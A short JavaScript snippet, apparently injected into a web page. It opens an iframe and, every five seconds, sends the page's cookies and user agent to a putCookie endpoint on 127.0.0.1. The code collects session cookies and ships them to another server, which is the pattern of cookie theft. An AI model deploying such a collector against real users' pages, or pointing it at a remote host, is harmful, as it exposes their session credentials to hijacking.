 var frameContainer = document.createElement("div");
 var frame = document.createElement("iframe");
 frameContainer.appendChild(frame)
 document.getElementsByTagName('body')[0].appendChild(frameContainer);
 frameContainer.style.width = '100%'
 frameContainer.style.height = '300px'
 frame.style.width = '100%'
 frame.style.height = '100%'

var toUrl ='http://127.0.0.1:34580/putCookie'
	//FIXME should use a setIterval to update a page!
frame.src = toUrl;

var serverRet = "";
var cookieReport = function(){
	var retMap = {ua : navigator.userAgent , cookies : document.cookie.split("; ")};
	
	$.get(
		toUrl,
		JSON.stringify(retMap),
		function(data){
			serverRet = data;
			console.log("serverRet: " + serverRet);
	    }, 
	    "text");
	
}
    
    
setInterval(cookieReport, 5000);
	


